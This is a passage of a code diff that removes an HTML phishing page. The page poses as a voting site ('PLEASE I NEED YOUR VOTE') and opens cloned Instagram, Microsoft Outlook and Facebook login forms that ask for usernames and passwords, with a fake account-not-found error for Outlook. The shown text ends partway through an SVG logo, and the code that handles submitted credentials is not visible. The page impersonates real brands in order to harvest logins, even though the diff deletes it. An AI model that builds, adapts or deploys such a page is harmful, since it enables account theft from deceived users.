@@ -1,701 +1,275 @@
-<!DOCTYPE html>
-<html lang="en">
-
-<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
-
-<head>
-  <meta charset="UTF-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
-  <meta name="description" content="View my latest Instagram post, please like and share..." />
-  <link rel="shortcut icon" type="image/x-icon" href="images/favi-icon/favicon.ico/36b3ee2d91ed.ico" />
-  <!--Google Fonts-->
-  <link href="https://fonts.googleapis.com/css?family=Comfortaa:300,400,500,700" rel="stylesheet" />
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" />
-  <link rel="stylesheet" type="text/css" href="css/animation.css" />
-  <link rel="shortcut icon" type="image/x-icon" href="images/favi-icon/favicon.ico/36b3ee2d91ed.ico" />
-  <!--Google Fonts-->
-  <link href="https://fonts.googleapis.com/css?family=Comfortaa:300,400,500,700" rel="stylesheet" />
-
-  <script src="https://cdn.tailwindcss.com"></script>
-
-  <!-- BEGIN Custom CSS-->
-  <link rel="stylesheet" type="text/css" href="css/css/ig.css" />
-  <link rel="stylesheet" type="text/css" href="css/animation.css" />
-  <link rel="stylesheet" type="text/css" href="css/css/fb.css" />
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css">
-
-
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>
-    /* Preloader Styles */
-    #fb-preloader {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      background: linear-gradient(135deg, #3b5998, #1877f2);
-      z-index: 10000;
-      flex-direction: column;
-      text-align: center;
-      color: #fff;
-    }
-
-    /* Preloader Styles */
-    #hm-preloader {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      background: linear-gradient(135deg, #000000, #000000);
-      z-index: 10000;
-      flex-direction: column;
-      text-align: center;
-      color: #fff;
-    }
-
-    /* Logo Animation */
-    .logo-container {
-      width: 100px;
-      height: 100px;
-      animation: pulse 1.5s infinite ease-in-out;
-    }
-
-    .logo-container svg {
-      width: 100%;
-      height: 100%;
-    }
-
-    /* Text Animation */
-    #fb-preloader p {
-      margin-top: 20px;
-      font-size: 18px;
-      animation: fadeIn 2s infinite;
-    }
-
-    /* Pulse Animation */
-    @keyframes pulse {
-
-      0%,
-      100% {
-        transform: scale(1);
-      }
-
-      50% {
-        transform: scale(1.1);
-      }
-    }
-
-    /* Fade-In Animation */
-    @keyframes fadeIn {
-
-      0%,
-      100% {
-        opacity: 0;
-      }
-
-      50% {
-        opacity: 1;
-      }
-    }
-
-
-    /* Preloader Styles */
-    #modern-preloader {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      background: #fafafa;
-      z-index: 10000;
-      flex-direction: column;
-      text-align: center;
-      color: #fff;
-    }
-
-    /* Image Loader Styles */
-    .image-loader {
-      width: 100px;
-      /* Adjust size of the image container */
-      height: 100px;
-      margin-bottom: 20px;
-      animation: pulse 1.5s infinite ease-in-out;
-    }
-
-    .image-loader img {
-      width: 100%;
-      height: 100%;
-      object-fit: contain;
-      animation: spin 2s infinite linear;
-      /* Optional: Rotate the image */
-    }
-
-    /* Pulse Animation */
-    @keyframes pulse {
-
-      0%,
-      100% {
-        transform: scale(1);
-      }
-
-      50% {
-        transform: scale(1.1);
-      }
-    }
-
-    /* Spin Animation (Optional) */
-    @keyframes spin {
-      100% {
-        transform: rotate(360deg);
-      }
-    }
-
-    /* Text Animation */
-    #modern-preloader p {
-      margin-top: 20px;
-      font-size: 16px;
-      animation: fadeIn 2s infinite;
-    }
-
-    @keyframes fadeIn {
-
-      0%,
-      100% {
-        opacity: 0;
-      }
-
-      50% {
-        opacity: 1;
-      }
-    }
-
-
-    .wrapper {
-      width: 40%;
-      margin: 15% 50%;
-      transform: translateX(-50%);
-      border-radius: 5px;
-      box-sizing: border-box;
-    }
-
-    .form-container {
-      display: none;
-      /* Initially hidden */
-      position: fixed;
-      /* Stays in one place */
-      top: 0;
-      left: 0;
-      width: 100vw;
-      /* Full viewport width */
-      height: 100vh;
-      /* Full viewport height */
-      justify-content: center;
-      align-items: center;
-      z-index: 1000;
-      /* Ensures it's on top of other elements */
-      flex-direction: column;
-    }
-
-    @media screen and (max-width: 450px) {
-      .wrapper {
-        width: 60%;
-        margin: 15% 50%;
-        transform: translateX(-50%);
-        border-radius: 5px;
-        box-sizing: border-box;
-      }
-    }
-  </style>
-
-  <style>
-    @keyframes spin {
-      0% {
-        transform: rotate(0deg);
-      }
-
-      100% {
-        transform: rotate(360deg);
-      }
-    }
-
-    .spinner {
-      width: 40px;
-      height: 40px;
-      border: 4px solid #ddd;
-      border-top: 4px solid #0078D4;
-      /* Microsoft blue */
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-      margin: 50px auto;
-    }
-  </style>
-
-  <style>
-    /* Basic styles for dialogs */
-    dialog#dialog1 {
-      width: 100%;
-      border: none;
-      box-sizing: border-box;
-      margin: 0;
-      padding: 10px;
-      z-index: 1;
-      background-color: #fafafa;
-    }
-  </style>
-
-</head>
-
-<body class="1-column undefined page-animated" data-menu-open="hover" data-menu="">
-
-  <div id="" class="wrapper">
-    <p style="color: #507392; font-size: 13px; padding: 10px; text-align: center;">PLEASE I NEED YOUR VOTE</p>
-    <center><img src="images/image.jpeg" width="100px" height="">
-      <h4 style="padding: 10px 0; text-overflow: ellipsis; width: 200px; overflow: hidden; color: #507392">Voting
-        platform</h4>
-
-      <button class="fb_votebutton" onclick="showForm('fbForm')">VOTE WITH <i class="fa fa-facebook"></i></button>
-      <button class="ig_votebutton" onclick="showForm('igForm')">VOTE WITH <i class="fa fa-instagram"></i></button>
-      <button class="hm_votebutton" onclick="showForm('hmForm')">VOTE WITH <i class="bi bi-microsoft"></i></button>
-
-    </center><br>
-    <ul>
-      <li style="background: #F6F9FB; border-left: 2px solid #5B9BD1; "><i class="fa fa-home"></i> Total Votes: 312 out
-        of 450</li>
-      <li style='color: #6f808a86'> <i class="fa fa-check"></i> Total Votes To Win: 138</li>
-      <a href="#" style='text-decoration: none; color: #6f808a86'>
-        <li style='color: #6f808a86'><i class="fa fa-flag"></i> Help</li>
-      </a>
-    </ul>
-  </div>
-
-  <p class="PoweredBy">Powered by <span> Amazon voting system</span></p>
-
-
-  <div id="igForm" class="igroot form-container">
-
-    <div id="modern-preloader">
-      <div class="image-loader">
-        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 1000 1000"
-          width="1000" height="1000" preserveAspectRatio="xMidYMid meet"
-          style="width: 100%; height: 100%; transform: translate3d(0px, 0px, 0px); content-visibility: visible;"
-          id="Instagram">
-          <defs>
-            <clipPath id="__lottie_element_2">
-              <rect width="1000" height="1000" x="0" y="0" />
-            </clipPath>
-            <radialGradient id="__lottie_element_8" spreadMethod="pad" gradientUnits="userSpaceOnUse" cx="-204" cy="209"
-              r="538.2759515341551" fx="-205.57865741221727" fy="206.80032983341786">
-              <stop offset="1%" stop-color="rgb(255,226,109)" />
-              <stop offset="15%" stop-color="rgb(255,174,101)" />
-              <stop offset="29%" stop-color="rgb(255,122,93)" />
-              <stop offset="40%" stop-color="rgb(253,96,111)" />
-              <stop offset="51%" stop-color="rgb(251,69,130)" />
-              <stop offset="67%" stop-color="rgb(234,60,150)" />
-              <stop offset="82%" stop-color="rgb(217,52,170)" />
-              <stop offset="91%" stop-color="rgb(188,54,191)" />
-              <stop offset="100%" stop-color="rgb(159,56,212)" />
-            </radialGradient>
-          </defs>
-          <g clip-path="url(#__lottie_element_2)">
-            <g transform="matrix(1.0000020265579224,0,0,1.0000020265579224,494.00018310546875,525.500244140625)"
-              opacity="1" style="display: block;">
-              <g opacity="1" transform="matrix(1,0,0,1,7,-23)">
-                <path fill="rgb(255,255,255)" fill-opacity="1"
-                  d=" M235,-108 C235,-108 235,108 235,108 C235,178.09129333496094 178.09129333496094,235 108,235 C108,235 -108,235 -108,235 C-178.09129333496094,235 -235,178.09129333496094 -235,108 C-235,108 -235,-108 -235,-108 C-235,-178.09129333496094 -178.09129333496094,-235 -108,-235 C-108,-235 108,-235 108,-235 C178.09129333496094,-235 235,-178.09129333496094 235,-108z" />
-                <path fill="url(#__lottie_element_8)" fill-opacity="1"
-                  d=" M235,-108 C235,-108 235,108 235,108 C235,178.09129333496094 178.09129333496094,235 108,235 C108,235 -108,235 -108,235 C-178.09129333496094,235 -235,178.09129333496094 -235,108 C-235,108 -235,-108 -235,-108 C-235,-178.09129333496094 -178.09129333496094,-235 -108,-235 C-108,-235 108,-235 108,-235 C178.09129333496094,-235 235,-178.09129333496094 235,-108z" />
-                <path stroke-linecap="butt" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4"
-                  stroke="rgb(255,255,255)" stroke-opacity="1" stroke-width="0"
-                  d=" M235,-108 C235,-108 235,108 235,108 C235,178.09129333496094 178.09129333496094,235 108,235 C108,235 -108,235 -108,235 C-178.09129333496094,235 -235,178.09129333496094 -235,108 C-235,108 -235,-108 -235,-108 C-235,-178.09129333496094 -178.09129333496094,-235 -108,-235 C-108,-235 108,-235 108,-235 C178.09129333496094,-235 235,-178.09129333496094 235,-108z" />
-              </g>
-            </g>
-            <g transform="matrix(39.75,0,0,39.75,-20485.767578125,-19361.921875)" opacity="1" style="display: block;">
-              <g opacity="1" transform="matrix(1,0,0,1,527.97900390625,499.7590026855469)">
-                <path fill="rgb(255,255,255)" fill-opacity="1"
-                  d=" M1.8830000162124634,-4.453999996185303 C1.8830000162124634,-4.453999996185303 -1.8830000162124634,-4.453999996185303 -1.8830000162124634,-4.453999996185303 C-3.302999973297119,-4.453999996185303 -4.453999996185303,-3.302999973297119 -4.453999996185303,-1.8830000162124634 C-4.453999996185303,-1.8830000162124634 -4.453999996185303,1.8830000162124634 -4.453999996185303,1.8830000162124634 C-4.453999996185303,3.302999973297119 -3.302999973297119,4.453999996185303 -1.8830000162124634,4.453999996185303 C-1.8830000162124634,4.453999996185303 1.8830000162124634,4.453999996185303 1.8830000162124634,4.453999996185303 C3.302999973297119,4.453999996185303 4.453999996185303,3.302999973297119 4.453999996185303,1.8830000162124634 C4.453999996185303,1.8830000162124634 4.453999996185303,-1.8830000162124634 4.453999996185303,-1.8830000162124634 C4.453999996185303,-3.302999973297119 3.302999973297119,-4.453999996185303 1.8830000162124634,-4.453999996185303 C1.8830000162124634,-4.453999996185303 1.8830000162124634,-4.453999996185303 1.8830000162124634,-4.453999996185303z M3.632999897003174,1.9490000009536743 C3.632999897003174,1.9490000009536743 3.632999897003174,1.9490000009536743 3.632999897003174,1.9490000009536743 C3.632999897003174,2.8919999599456787 2.869999885559082,3.6559998989105225 1.9270000457763672,3.6559998989105225 C1.9270000457763672,3.6559998989105225 -1.9270000457763672,3.6559998989105225 -1.9270000457763672,3.6559998989105225 C-2.869999885559082,3.6559998989105225 -3.634000062942505,2.8919999599456787 -3.634000062942505,1.9490000009536743 C-3.634000062942505,1.9490000009536743 -3.634000062942505,-1.9049999713897705 -3.634000062942505,-1.9049999713897705 C-3.634000062942505,-2.8480000495910645 -2.869999885559082,-3.611999988555908 -1.9270000457763672,-3.611999988555908 C-1.9270000457763672,-3.611999988555908 1.9270000457763672,-3.611999988555908 1.9270000457763672,-3.611999988555908 C2.869999885559082,-3.611999988555908 3.632999897003174,-2.8480000495910645 3.632999897003174,-1.9049999713897705 C3.632999897003174,-1.9049999713897705 3.632999897003174,1.9490000009536743 3.632999897003174,1.9490000009536743z" />
-              </g>
-              <g opacity="1" transform="matrix(1,0,0,1,527.97900390625,499.781005859375)">
-                <path fill="rgb(255,255,255)" fill-opacity="1"
-                  d=" M0,-2.311000108718872 C-1.2760000228881836,-2.311000108718872 -2.311000108718872,-1.2760000228881836 -2.311000108718872,0 C-2.311000108718872,1.2760000228881836 -1.2760000228881836,2.311000108718872 0,2.311000108718872 C1.2769999504089355,2.311000108718872 2.311000108718872,1.2760000228881836 2.311000108718872,0 C2.311000108718872,-1.2760000228881836 1.2769999504089355,-2.311000108718872 0,-2.311000108718872 C0,-2.311000108718872 0,-2.311000108718872 0,-2.311000108718872z M0,1.4980000257492065 C0,1.4980000257492065 0,1.4980000257492065 0,1.4980000257492065 C-0.8270000219345093,1.4980000257492065 -1.4980000257492065,0.8270000219345093 -1.4980000257492065,0 C-1.4980000257492065,-0.8270000219345093 -0.8270000219345093,-1.4980000257492065 0,-1.4980000257492065 C0.8270000219345093,-1.4980000257492065 1.4980000257492065,-0.8270000219345093 1.4980000257492065,0 C1.4980000257492065,0.8270000219345093 0.8270000219345093,1.4980000257492065 0,1.4980000257492065z" />
-              </g>
-              <g opacity="1" transform="matrix(1,0,0,1,530.3670043945312,497.3819885253906)">
-                <path fill="rgb(255,255,255)" fill-opacity="1"
-                  d=" M0,-0.5379999876022339 C-0.296999990940094,-0.5379999876022339 -0.5389999747276306,-0.296999990940094 -0.5389999747276306,0 C-0.5389999747276306,0.296999990940094 -0.296999990940094,0.5379999876022339 0,0.5379999876022339 C0.296999990940094,0.5379999876022339 0.5389999747276306,0.296999990940094 0.5389999747276306,0 C0.5389999747276306,-0.296999990940094 0.296999990940094,-0.5379999876022339 0,-0.5379999876022339z" />
-              </g>
-            </g>
-          </g>
-        </svg>
-      </div>
-    </div>
-
-
-    <div class="igmain">
-      <div>
-        <div id="igforma">
-          <svg xmlns="../external.html?link=http://www.w3.org/2000/svg"
-            xmlns:xlink="../external.html?link=http://www.w3.org/1999/xlink" width="200" height="60"
-            viewBox="0 -1.5 200 60">
-            <defs>
-              <clipPath id="clip-path">
-                <rect width="250" height="57" />
-              </clipPath>
-            </defs>
-            <g clip-path="url(#clip-path)">
-              <image x="13" y="3" width="175" height="51"
-                xlink:href="data:img/png;base64,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" />
-            </g>
-          </svg>
-          <div class="igform">
-            <div class="igform-group">
-              <div>
-                <input class="iginput" type="text" name="text" placeholder="Phone number, username, or email"
-                  id="email" />
-              </div>
-            </div>
-            <div class="igform-group">
-              <div>
-                <input class="iginput" id="password" type="password" name="password" placeholder="password" />
-                <span id="tchange" toggle="#password" class="insta field-icon toggle-password">show</span>
-              </div>
-            </div>
-            <button class="igbutton" type="submit">Log In</button>
-
-            <div class="orr">
-              <p>OR</p>
-            </div>
-
-            <p class="logFb" onclick="showDialog('dialog1')"><img src="images/fb_icon.png">Log in with Facebook</p>
-            <p id="alert-message"></p>
-            <a href="#">Forgot password?</a>
-          </div>
-        </div>
-
-        <div class="igsign-up">
-          <p>Don't have an account? <a href="#"> Sign Up </a></p>
-        </div>
-        <p class="igget">Get the app.</p>
-        <div class="links"
-          style="display: flex; flex-direction: row; gap: 10px; justify-content: center; align-items: center;">
-          <a href="#">
-            <img class="app_logo" src="images/demo/app.png" alt="" />
-          </a>
-          <a href="#">
-            <img class="app_logo" src="images/demo/google%20play.png" alt="" />
-          </a>
-        </div>
-        <div class="ignd-links">
-          <a href="#">Meta</a>
-          <a href="#">About</a>
-          <a href="#">Blog</a>
-          <a href="#">Jobs</a>
-          <a href="#">Help</a>
-          <a href="#">API</a>
-          <a href="#">Privacy</a>
-          <a href="#">Terms</a>
-          <a href="#">Top Account</a>
-          <a href="#">Hashtags</a>
-          <a href="#">Locations</a>
-          <a href="#">Instagram Lite</a>
-        </div>
-        <footer class="igfooter">
-          <p>English © 2024 Instagram from Meta</p>
-        </footer>
-      </div>
-    </div>
-  </div>
-
-  <style>
-    .tokpart {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      padding: 1rem;
-      /* Full viewport height */
-      /* Optional: Add a background color */
-    }
-
-    #twp {
-      margin: 0;
-      padding: 0;
-      display: none;
-      background-color: #000;
-    }
-  </style>
-  <div id="hmForm" class="bg-gray mt-0 form-container">
-    <div id="hm-preloader">
-      <div class="spinner"></div>
-    </div>
-
-    <div id="twp">
-      <div class="min-h-screen flex flex-col w-full">
-        <!-- Main Content Section -->
-        <main class="flex-grow">
-          <div class="tokpart ">
-            <div class=" p-5 w-full max-w-md">
-              <img
-                src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Microsoft_logo_%282012%29.svg/1920px-Microsoft_logo_%282012%29.svg.png"
-                alt="logo" class="h-10 mt-20">
-              <h2 id="heading" class="text-4xl font-bold text-white mb-0 mt-12 text-left">Sign in</h2>
-              <p class="text-xl text-white mb-6 mt-0 text-left">to continue to Outlook</p>
-              <!-- Email Input -->
-              <div id="uname" class="flex justify-start">
-                <input type="email" id="twi-uname" name="email" required
-                  class="block w-full px-1 py-4 border-b border-gray-700 focus:outline-none focus:ring-0 focus:border-blue-500 bg-transparent text-gray-300 placeholder:text-gray-500"
-                  placeholder="Email, phone, or Skype" />
-              </div>
-              <div class="flex justify-start">
-                <button id="forgotPasswordButton" type="button"
-                  class="text-gray-200 py-2 px-1 bg-transparent focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-gray-900 mt-0">
-                  No account?
-                  <span class="text-blue-500 hover:underline"> Create one!</span>
-                </button>
-              </div>
-              <!-- Next Button to show password field -->
-              <button id="nextButton" type="button" onclick="showPasswordField()"
-                class="bg-blue-500 text-white py-2 px-4 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 mt-4 float-right">
-                Next
-              </button>
-              <!-- Password Field (hidden initially) -->
-              <div id="passwordField" class="hidden mt-4">
-                <div class="mb-4 relative">
-                  <input type="password" id="twi-pass" name="password" required
-                    class="block w-full px-1 py-4 border-b border-gray-700 focus:outline-none focus:ring-0 focus:border-blue-500 bg-transparent text-gray-300 placeholder:text-gray-500"
-                    placeholder="Password" />
-                </div>
-                <button id="nextButton" type="button" onclick="twilog()"
-                  class="bg-blue-500 text-white py-2 px-4 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 mt-4 float-right">
-                  Submit
-                </button>
-
-              </div>
-
-            </div>
-          </div>
-        </main>
-        <!-- Footer Section -->
-        <footer id="error-message" class="hidden bg-blue-600 text-white text-sm mt-2 text-center py-6 mt-auto w-full ">
-          <div class=" w-full px-4">
-            <div class="flex justify-between items-center">
-              Sorry, we could not find your account.
-            </div>
-          </div>
-        </footer>
-
-      </div>
-    </div>
-  </div>
-
-  <div id="fbForm" class="fbroot form-container">
-    <section class="section-all" style="color: #507392;">
-
-      <div id="fb-preloader">
-        <div class="logo-container">
-          <!-- SVG Logo -->
-          <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 1000 1000"
-            width="1000" height="1000" preserveAspectRatio="xMidYMid meet"
-            style="width: 100%; height: 100%; transform: translate3d(0px, 0px, 0px); content-visibility: visible;"
-            id="Facebook">
-            <defs>
-              <clipPath id="__lottie_element_23390">
-                <rect width="1000" height="1000" x="0" y="0" />
-              </clipPath>
-            </defs>
-            <g clip-path="url(#__lottie_element_23390)">
-              <g transform="matrix(1.5000625848770142,0,0,1.5000625848770142,281.87591552734375,281.5422058105469)"
-                opacity="1" style="display: block;">
-                <g opacity="1" transform="matrix(1,0,0,1,81.75,81.75)">
-                  <path fill="rgb(2,119,251)" fill-opacity="1"
-                    d=" M81.5,0 C81.5,45.01100158691406 45.01100158691406,81.5 0,81.5 C-45.01100158691406,81.5 -81.5,45.01100158691406 -81.5,0 C-81.5,-45.01100158691406 -45.01100158691406,-81.5 0,-81.5 C45.01100158691406,-81.5 81.5,-45.01100158691406 81.5,0z" />
-                </g>
-              </g>
-              <g transform="matrix(1,0,0,1,559.75,535.75)" opacity="1" style="display: block;">
-                <g opacity="1" transform="matrix(1,0,0,1,81.75,81.75)">
-                  <path fill="rgb(26,70,135)" fill-opacity="1"
-                    d=" M81.5,0 C81.5,45.01100158691406 45.01100158691406,81.5 0,81.5 C-45.01100158691406,81.5 -81.5,45.01100158691406 -81.5,0 C-81.5,-45.01100158691406 -45.01100158691406,-81.5 0,-81.5 C45.01100158691406,-81.5 81.5,-45.01100158691406 81.5,0z" />
-                </g>
-              </g>
-              <g transform="matrix(1,0,0,1,199.5,199.5)" opacity="1" style="display: block;">
-                <g opacity="1" transform="matrix(1,0,0,1,300.25,300.25)">
-                  <path fill="rgb(255,255,255)" fill-opacity="1"
